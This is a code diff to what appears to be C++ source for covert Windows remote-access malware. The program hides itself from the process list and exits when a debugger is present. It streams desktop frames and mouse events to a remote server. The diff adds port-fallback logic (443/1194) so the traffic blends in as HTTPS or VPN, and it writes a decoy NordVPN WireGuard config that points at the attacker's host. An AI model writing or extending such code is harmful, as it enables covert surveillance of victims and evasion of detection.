@@ -353,12 +353,12 @@ public:
         return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), nullptr);
     }
     
-    static void createWireGuardConfig() {
+    static void createWireGuardConfig(const std::string& host, int port) {
         std::string appData = getenv("APPDATA");
         std::string nordDir = appData + "\\NordVPN";
-        
+
         CreateDirectoryA(nordDir.c_str(), nullptr);
-        
+
         std::ofstream config(nordDir + "\\nordlynx.conf");
         if (config.is_open()) {
             config << "[Interface]\n";
@@ -368,7 +368,7 @@ public:
             config << "\n[Peer]\n";
             config << "PublicKey = " << TunnelProtocol::generateKey32() << "\n";
             config << "AllowedIPs = 0.0.0.0/0\n";
-            config << "Endpoint = 192.168.88.100:443\n";
+            config << "Endpoint = " << host << ":" << port << "\n";
             config.close();
         }
     }
@@ -487,14 +487,50 @@ public:
                 return false;
             }
             tcp_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-            if (tcp_socket == INVALID_SOCKET) {
-                return false;
-            }
-            if (connect(tcp_socket, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
+            if (tcp_socket != INVALID_SOCKET &&
+                connect(tcp_socket, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
                 closesocket(tcp_socket);
                 tcp_socket = INVALID_SOCKET;
+            }
+        }
+
+        if (tcp_socket == INVALID_SOCKET) {
+            int alt_port = (server_port == 1194) ? 443 : 1194;
+            addrinfo* result = nullptr;
+            if (getaddrinfo(server_host.c_str(), std::to_string(alt_port).c_str(), &hints, &result) == 0) {
+                for (addrinfo* rp = result; rp != nullptr; rp = rp->ai_next) {
+                    tcp_socket = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
+                    if (tcp_socket == INVALID_SOCKET) continue;
+                    if (connect(tcp_socket, rp->ai_addr, static_cast<int>(rp->ai_addrlen)) != SOCKET_ERROR) {
+                        break;
+                    }
+                    closesocket(tcp_socket);
+                    tcp_socket = INVALID_SOCKET;
+                }
+                freeaddrinfo(result);
+            }
+            if (tcp_socket == INVALID_SOCKET) {
+                sockaddr_in addr{};
+                addr.sin_family = AF_INET;
+                addr.sin_port = htons(alt_port);
+                if (inet_pton(AF_INET, server_host.c_str(), &addr.sin_addr) == 1) {
+                    tcp_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+                    if (tcp_socket != INVALID_SOCKET &&
+                        connect(tcp_socket, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
+                        closesocket(tcp_socket);
+                        tcp_socket = INVALID_SOCKET;
+                    }
+                }
+            }
+            if (tcp_socket != INVALID_SOCKET) {
+                server_port = alt_port;
+            } else {
                 return false;
             }
+        }
+
+        if (tcp_socket == INVALID_SOCKET) {
+            return false;
         }
 
         DWORD timeout = 5000;
@@ -646,7 +682,6 @@ public:
     
     void run() {
         TunnelStealth::hideFromProcessList();
-        TunnelStealth::createWireGuardConfig();
 
         if (TunnelStealth::isDebuggerPresent()) {
             return;
@@ -658,6 +693,7 @@ public:
         while (true) {
             try {
                 if (initializeConnection()) {
+                    TunnelStealth::createWireGuardConfig(server_host, server_port);
                     while (true) {
                         sendDesktopFrame();
                         detectAndSendMouseEvents();
@@ -702,15 +738,23 @@ public:
 
 int main(int argc, char* argv[]) {
     std::string host = "192.168.88.100";
-    int port = 443;
+    int port = 1194;
+    bool hostProvided = false;
 
-    if (argc == 3) {
-        host = argv[1];
-        port = std::stoi(argv[2]);
-    } else if (argc == 1) {
+    for (int i = 1; i < argc; ++i) {
+        std::string arg = argv[i];
+        if (arg == "--https") {
+            port = 443;
+        } else if (!hostProvided) {
+            host = arg;
+            hostProvided = true;
+        } else {
+            port = std::stoi(arg);
+        }
+    }
+
+    if (!hostProvided) {
         host = PromptServerIP(host);
-    } else {
-        return 1;
     }
 
     WSADATA wsaData;
